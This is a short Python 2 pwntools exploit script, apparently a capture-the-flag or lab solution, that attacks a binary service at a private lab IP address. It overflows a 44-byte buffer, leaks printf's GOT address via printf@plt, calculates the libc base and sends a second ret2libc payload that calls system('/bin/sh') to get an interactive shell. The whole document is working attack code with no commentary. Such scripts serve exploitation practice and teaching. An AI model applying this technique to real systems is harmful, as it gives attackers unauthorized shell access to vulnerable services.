#!/usr/bin/env python2
from pwn import *
import struct

p = remote("192.168.56.101", 32812)
p.recvuntil('>')

pwnme = p32(0x080485f6)
printf_plt = p32(0x8048400)
printf_got = p32(0x804a00c)


buf = "A"*44
buf += printf_plt
buf += pwnme
buf += printf_got

p.sendline(buf)
leak_addr = u32(p.recvuntil("Go")[1:5])
print leak_addr
#print "leaked address is at: 0x{:08x}".format(leak_addr)
print ("leaked address is at: " + hex(leak_addr))

libc_main = leak_addr-0x49940
libc_sh = 0x15cdc8
libc_sys = 0x3ab40
bin_sh = p32(libc_main+libc_sh)
system_addr = p32(libc_main+libc_sys)


print p.recvuntil('>')
buf2 = "A"*44
buf2 += system_addr
buf2 += "BBBB"
buf2 += bin_sh
p.sendline(buf2)
p.interactive()
